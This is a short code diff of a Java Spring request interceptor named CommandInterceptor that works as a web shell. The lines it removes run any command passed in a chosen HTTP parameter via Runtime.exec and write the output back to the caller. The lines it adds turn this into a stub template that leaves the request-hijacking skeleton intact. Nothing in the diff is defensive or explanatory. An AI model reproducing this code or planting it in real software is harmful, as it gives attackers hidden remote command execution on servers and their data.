@@ -15,17 +15,12 @@ import java.io.InputStream;
 public class CommandInterceptor implements AsyncHandlerInterceptor {
     public static String paramName;
 
-
-    public CommandInterceptor() {
-    }
-
     @Override
     public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
         try {
-            String cmd = request.getParameter(paramName);
-            if (cmd != null) {
-                Process exec = Runtime.getRuntime().exec(cmd);
-                InputStream inputStream = exec.getInputStream();
+            String param = getParam(request.getParameter(paramName));
+            if (param != null) {
+                InputStream inputStream = getInputStream(param);
                 ServletOutputStream outputStream = response.getOutputStream();
                 byte[] buf = new byte[8192];
                 int length;
@@ -34,10 +29,18 @@ public class CommandInterceptor implements AsyncHandlerInterceptor {
                 }
                 return false;
             }
-        } catch (Exception e) {
+        } catch (Throwable e) {
             e.printStackTrace();
         }
         return true;
+    }
+
+    private String getParam(String param) {
+        return param;
+    }
+
+    private InputStream getInputStream(String param) throws Exception {
+        return null;
     }
 
     @Override
